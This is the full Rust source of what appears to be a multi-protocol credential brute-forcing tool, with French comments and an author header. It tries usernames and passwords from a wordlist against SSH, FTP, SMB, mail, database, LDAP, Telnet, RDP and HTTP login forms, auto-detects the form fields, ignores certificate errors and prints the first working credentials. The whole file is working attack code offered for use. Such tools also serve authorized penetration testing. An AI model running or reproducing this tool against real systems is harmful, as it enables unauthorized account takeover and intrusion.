mod args;
mod header;

use args::SupArgs;
use clap::Parser;
use std::sync::Arc;
use tokio::sync::Semaphore;
use tokio::fs::File;
use tokio::io::{AsyncBufReadExt, AsyncWriteExt, AsyncReadExt, BufReader};
use colored::*;
use ssh2::Session;
use reqwest::Client;
use suppaftp::AsyncFtpStream;
use base64::{engine::general_purpose, Engine as _};
use native_tls::TlsConnector;
use tokio::process::Command;
use mongodb::{options::ClientOptions, Client as MongoClient};
use tokio::task::JoinSet;
use tokio::time::{timeout, Duration};
use std::sync::atomic::{AtomicBool, Ordering};

// --- UTILITAIRES RÉSEAU ---

async fn connect_tls(host: &str, port: u16) -> Option<tokio_native_tls::TlsStream<tokio::net::TcpStream>> {
    let addr = format!("{}:{}", host, port);
    let connector = TlsConnector::builder().danger_accept_invalid_certs(true).build().ok()?;
    let tokio_connector = tokio_native_tls::TlsConnector::from(connector);
    let stream = timeout(Duration::from_secs(3), tokio::net::TcpStream::connect(&addr)).await.ok()?.ok()?;
    tokio_connector.connect(host, stream).await.ok()
}

// --- MODULES DE CONNEXION ---
async fn attempt_ssh(host: &str, port: u16, user: &str, pass: &str) -> bool {
    let addr = format!("{}:{}", host, port);
    let u = user.trim().to_string();
    let p = pass.trim().to_string();

    let result: Option<bool> = tokio::task::spawn_blocking(move || {
        // Connexion TCP
        let stream = match std::net::TcpStream::connect_timeout(
            &addr.parse().ok()?,
            std::time::Duration::from_secs(5)
        ) {
            Ok(s) => s,
            Err(_) => return None,
        };

        // Création de la session
        let mut sess = match Session::new() {
            Ok(s) => s,
            Err(_) => return None,
        };

        sess.set_tcp_stream(stream);
        sess.set_timeout(5000);

        // Handshake
        if sess.handshake().is_err() {
            return None;
        }

        // Authentification
        let auth_result = sess.userauth_password(&u, &p);
        let authenticated = sess.authenticated();

        // Déconnexion
        let _ = sess.disconnect(None, "Finished", None);

        Some(auth_result.is_ok() && authenticated)
    }).await.ok().flatten();

    result.unwrap_or(false)
}

        

async fn attempt_smb(host: &str, user: &str, pass: &str) -> bool {
    let share = format!("//{}", host);
    let out = Command::new("smbclient")
        .args([&share, "-U", user, pass, "-c", "ls", "-t", "3"])
        .output().await;

    match out {
        Ok(o) => {
            let res = String::from_utf8_lossy(&o.stderr);
            o.status.success() || (!res.contains("NT_STATUS_ACCESS_DENIED") && !res.contains("NT_STATUS_LOGON_FAILURE"))
        },
        _ => false,
    }
}

async fn attempt_smtp(host: &str, port: u16, user: &str, pass: &str) -> bool {
    if let Some(mut s) = connect_tls(host, port).await {
        let mut buf = [0; 1024];
        let _ = s.read(&mut buf).await;
        let _ = s.write_all(b"EHLO localhost\r\n").await;
        let _ = s.read(&mut buf).await;
        let _ = s.write_all(b"AUTH LOGIN\r\n").await;
        let _ = s.read(&mut buf).await;
        let _ = s.write_all(format!("{}\r\n", general_purpose::STANDARD.encode(user)).as_bytes()).await;
        let _ = s.read(&mut buf).await;
        let _ = s.write_all(format!("{}\r\n", general_purpose::STANDARD.encode(pass)).as_bytes()).await;
        let n = timeout(Duration::from_secs(2), s.read(&mut buf)).await.unwrap_or(Ok(0)).unwrap_or(0);
        return String::from_utf8_lossy(&buf[..n]).contains("235");
    }
    false
}

async fn attempt_pop3(host: &str, port: u16, user: &str, pass: &str) -> bool {
    if let Some(mut s) = connect_tls(host, port).await {
        let mut buf = [0; 1024];
        let _ = s.read(&mut buf).await;
        let _ = s.write_all(format!("USER {}\r\n", user).as_bytes()).await;
        let _ = s.read(&mut buf).await;
        let _ = s.write_all(format!("PASS {}\r\n", pass).as_bytes()).await;
        let n = timeout(Duration::from_secs(2), s.read(&mut buf)).await.unwrap_or(Ok(0)).unwrap_or(0);
        return String::from_utf8_lossy(&buf[..n]).contains("+OK");
    }
    false
}

async fn attempt_imap(host: &str, port: u16, user: &str, pass: &str) -> bool {
    if let Some(mut s) = connect_tls(host, port).await {
        let mut buf = [0; 1024];
        let _ = s.read(&mut buf).await;
        let _ = s.write_all(format!("A1 LOGIN {} {}\r\n", user, pass).as_bytes()).await;
        let n = timeout(Duration::from_secs(2), s.read(&mut buf)).await.unwrap_or(Ok(0)).unwrap_or(0);
        return String::from_utf8_lossy(&buf[..n]).contains("A1 OK");
    }
    false
}

async fn attempt_mysql(host: &str, port: u16, user: &str, pass: &str) -> bool {
    let url = format!("mysql://{}:{}@{}:{}", user, pass, host, port);
    timeout(Duration::from_secs(3), sqlx::MySqlPool::connect(&url)).await.is_ok()
}

async fn attempt_postgres(host: &str, port: u16, user: &str, pass: &str) -> bool {
    let url = format!("postgres://{}:{}@{}:{}/postgres", user, pass, host, port);
    timeout(Duration::from_secs(3), sqlx::PgPool::connect(&url)).await.is_ok()
}

async fn attempt_mongodb(host: &str, port: u16, user: &str, pass: &str) -> bool {
    let uri = format!("mongodb://{}:{}@{}:{}/", user, pass, host, port);
    if let Ok(opt) = ClientOptions::parse(uri).await {
        if let Ok(c) = MongoClient::with_options(opt) { 
            return timeout(Duration::from_secs(3), c.list_database_names(None, None)).await.is_ok(); 
        }
    }
    false
}

async fn attempt_ldap(host: &str, port: u16, user: &str, pass: &str) -> bool {
    let addr = format!("ldap://{}:{}", host, port);
    let u = user.to_string();
    let p = pass.to_string();
    tokio::task::spawn_blocking(move || {
        use ldap3::LdapConn;
        if let Ok(mut ldap) = LdapConn::new(&addr) {
            return ldap.simple_bind(&u, &p).is_ok();
        }
        false
    }).await.unwrap_or(false)
}

async fn attempt_telnet(host: &str, port: u16, user: &str, pass: &str) -> bool {
    if let Ok(Ok(mut s)) = timeout(Duration::from_secs(3), tokio::net::TcpStream::connect(format!("{}:{}", host, port))).await {
        let mut b = [0; 1024];
        let _ = s.read(&mut b).await;
        let _ = s.write_all(format!("{}\n", user).as_bytes()).await;
        tokio::time::sleep(Duration::from_millis(300)).await;
        let _ = s.write_all(format!("{}\n", pass).as_bytes()).await;
        let n = timeout(Duration::from_secs(2), s.read(&mut b)).await.unwrap_or(Ok(0)).unwrap_or(0);
        let res = String::from_utf8_lossy(&b[..n]).to_lowercase();
        return !res.contains("incorrect") && !res.contains("failed");
    }
    false
}

async fn attempt_rdp(host: &str, port: u16, user: &str, pass: &str) -> bool {
    let out = Command::new("xfreerdp")
    .args(["/v:", &format!("{}:{}", host, port), "/u:", user, "/p:", pass, "+auth-only", "/cert-ignore"])
    .output().await;
    out.map(|o| o.status.success()).unwrap_or(false)
}

// --- MOTEUR PRINCIPAL ---




 // --- MODULES DE CONNEXION ---

async fn attempt_http(
    client: &Client, 
    target: &str, 
    port: u16, 
    user: &str, 
    pass: &str, 
    error_msg: &Option<String>,
    u_field: &str, // Ce sera soit l'ID, soit le Name, soit le Type
    p_field: &str
) -> bool {
    let url = if target.starts_with("http") { 
        target.to_string() 
    } else {
        let proto = if port == 443 { "https" } else { "http" };
        format!("{}://{}:{}", proto, target, port)
    };
    
    // On construit dynamiquement le formulaire avec les sélecteurs fournis en arguments
    let params = [
        (u_field.trim(), user.trim()), 
        (p_field.trim(), pass.trim())
    ];
    
    let res = client.post(&url)
        .form(&params)
        .timeout(Duration::from_secs(5))
        .send()
        .await;
    
    if let Ok(r) = res {
        // On vérifie le code de statut (souvent 200 ou 302 en cas de succès)
        let status = r.status();
        if let Ok(text) = r.text().await {
            if let Some(msg) = error_msg {
                let text_lower = text.to_lowercase();
                let msg_lower = msg.to_lowercase();

                // Si le message d'erreur n'est PAS présent, c'est un succès potentiel
                if !text_lower.contains(&msg_lower) && (status.is_success() || status.is_redirection()) {
                    return true; 
                }
            }
        }
    }
    false
}
// --- MOTEUR PRINCIPAL ---
#[tokio::main]
async fn main() -> anyhow::Result<()> {
    header::show("Cheikh ELghadi", "https://github.com/23092-ctrl");
    let args = SupArgs::parse();

    let success_found = Arc::new(AtomicBool::new(false));
    let semaphore = Arc::new(Semaphore::new(args.threads));
    
    let client = Arc::new(
        reqwest::Client::builder()
            .danger_accept_invalid_certs(true)
            .redirect(reqwest::redirect::Policy::none())
            .build()?
    );

    let mut set = JoinSet::new();
    let t_service_lower = args.service.to_lowercase();
    let mut u_field = "username".to_string();
    let mut p_field = "password".to_string();

    if t_service_lower == "http" || t_service_lower == "https" {
        let url = if args.target.starts_with("http") { args.target.clone() } 
                  else { format!("http://{}", args.target) };

        // Fonction utilitaire pour extraire l'attribut name="..." d'une ligne HTML
        let extract_name = |line: &str| -> Option<String> {
            for pattern in ["name=\"", "name='"] {
                if let Some(pos) = line.find(pattern) {
                    let start = pos + pattern.len();
                    let quote = if pattern.contains('"') { "\"" } else { "'" };
                    if let Some(end) = line[start..].find(quote) {
                        return Some(line[start..start+end].to_string());
                    }
                }
            }
            None
        };
if let Some(ref ids) = args.ids {
            if let Ok(res) = client.get(&url).send().await {
                if let Ok(html) = res.text().await {
                   
                    for input_tag in html.split('<').filter(|t| t.to_lowercase().starts_with("input")) {
                        let tag_lower = input_tag.to_lowercase();
                        
                        for (i, target_id) in ids.iter().enumerate() {
                            let id_pattern = format!("id=\"{}\"", target_id.to_lowercase());
                            let id_pattern_single = format!("id='{}'", target_id.to_lowercase());

                            if tag_lower.contains(&id_pattern) || tag_lower.contains(&id_pattern_single) {
                                // On a trouvé la balise qui contient l'ID, on cherche son 'name'
                                if let Some(name) = extract_name(input_tag) {
                                    if i == 0 { u_field = name; }
                                    else { p_field = name; }
                                }
                            }
                        }
                    }
                }
            }
        }
        else if let Some(ref names) = args.names {
            u_field = names[0].clone();
            p_field = names[1].clone();
        } else if let Some(ref types) = args.types {
            if let Ok(res) = client.get(&url).send().await {
                if let Ok(html) = res.text().await {
                    for line in html.lines() {
                        if line.contains(&format!("type=\"{}\"", types[0])) || line.contains(&format!("type='{}'", types[0])) {
                            if let Some(n) = extract_name(line) { u_field = n; }
                        }
                        if line.contains(&format!("type=\"{}\"", types[1])) || line.contains(&format!("type='{}'", types[1])) {
                            if let Some(n) = extract_name(line) { p_field = n; }
                        }
                    }
                }
            }
        }
    }

    let default_port = match t_service_lower.as_str() {
        "ssh" => 22, "ftp" => 21, "smb" => 445, "mysql" => 3306,
        "http" | "https" => 80, "rdp" => 3389, "telnet" => 23,
        _ => 80,
    };
    let port = args.port.unwrap_or(default_port);

    let f_dict = File::open(&args.wordlist).await?;
    let mut reader = BufReader::new(f_dict);
    let mut line_buffer = String::new();

    println!("[*] Cible : {}", args.target.cyan());
    
    if t_service_lower == "http" || t_service_lower == "https" {
        println!("[*] Service : {}", t_service_lower.to_uppercase().magenta().bold());
        println!("[*] Champs détectés : {} [User] | {} [Pass]", u_field.yellow(), p_field.yellow());
    } else {
        println!("[*] Service : {}", t_service_lower.to_uppercase().magenta().bold());
        if let Some(ref u) = args.user {
            println!("[*] Utilisateur cible : {}", u.yellow());
        }
    }
    println!("------------------------------------------------------------");

    while let Ok(n) = reader.read_line(&mut line_buffer).await {
        if n == 0 { break; }
        let raw_line = line_buffer.trim().to_string();
        line_buffer.clear(); 
        if raw_line.is_empty() { continue; }

        let (u, p) = if raw_line.contains(':') {
            let parts: Vec<&str> = raw_line.splitn(2, ':').collect();
            (parts[0].trim().to_string(), parts[1].trim().to_string())
        } else if let Some(ref fixed_pass) = args.password {
            (raw_line, fixed_pass.clone())
        } else if let Some(ref fixed_user) = args.user {
            (fixed_user.clone(), raw_line)
        } else {
            (raw_line.clone(), raw_line)
        };

        let thread_user = u; 
        let thread_pass = p;
        let t_target = args.target.clone();
        let t_service = t_service_lower.clone();
        let t_error = args.error.clone();
        let t_u_f = u_field.clone();
        let t_p_f = p_field.clone();
        let t_client = Arc::clone(&client);
        let t_success = Arc::clone(&success_found);
        let t_port = port;
        let t_delay = args.delay;

        let permit = Arc::clone(&semaphore).acquire_owned().await?;

        set.spawn(async move {
            let _permit = permit;
            if t_delay > 0 { tokio::time::sleep(Duration::from_millis(t_delay)).await; }
            if t_success.load(Ordering::SeqCst) { return; }
            
            let ok = match t_service.as_str() {
                "http" | "https" => attempt_http(&t_client, &t_target, t_port, &thread_user, &thread_pass, &t_error, &t_u_f, &t_p_f).await,
                "ssh" => attempt_ssh(&t_target, t_port, &thread_user, &thread_pass).await,
                "ftp" => {
                    let addr = format!("{}:{}", t_target, t_port);
                    if let Ok(Ok(mut ftp)) = timeout(Duration::from_secs(5), AsyncFtpStream::connect(addr)).await {
                        let res = ftp.login(&thread_user, &thread_pass).await.is_ok();
                        let _ = ftp.quit().await;
                        res
                    } else { false }
                },
                "smtp"     => attempt_smtp(&t_target, t_port, &thread_user, &thread_pass).await,
                "pop3"     => attempt_pop3(&t_target, t_port, &thread_user, &thread_pass).await,
                "imap"     => attempt_imap(&t_target, t_port, &thread_user, &thread_pass).await,
                "mysql"    => attempt_mysql(&t_target, t_port, &thread_user, &thread_pass).await,
                "postgres" => attempt_postgres(&t_target, t_port, &thread_user, &thread_pass).await,
                "mongodb"  => attempt_mongodb(&t_target, t_port, &thread_user, &thread_pass).await,
                "ldap"     => attempt_ldap(&t_target, t_port, &thread_user, &thread_pass).await,
                "telnet"   => attempt_telnet(&t_target, t_port, &thread_user, &thread_pass).await,
                "rdp"      => attempt_rdp(&t_target, t_port, &thread_user, &thread_pass).await,
                "smb"      => attempt_smb(&t_target, &thread_user, &thread_pass).await,
                _ => false,
            };

            if ok {
                if t_success.swap(true, Ordering::SeqCst) == false {
                    println!("\n\n{}", "====================================================".green().bold());
                    println!("{} SUCCÈS TROUVÉ !", "[+]".green().bold());
                    println!("----------------------------------------------------");
                    println!("{} SERVICE     : {}", " >".cyan(), t_service.to_uppercase().bright_magenta().bold());
                    println!("{} UTILISATEUR : {}", " >".cyan(), thread_user.bright_white().bold());
                    println!("{} MOT DE PASSE : {}", " >".cyan(), thread_pass.bright_yellow().bold());
                    println!("{}", "====================================================".green().bold());
                    std::process::exit(0);
                }
            }
        });
    }
    while let Some(_) = set.join_next().await {}
    Ok(())
}
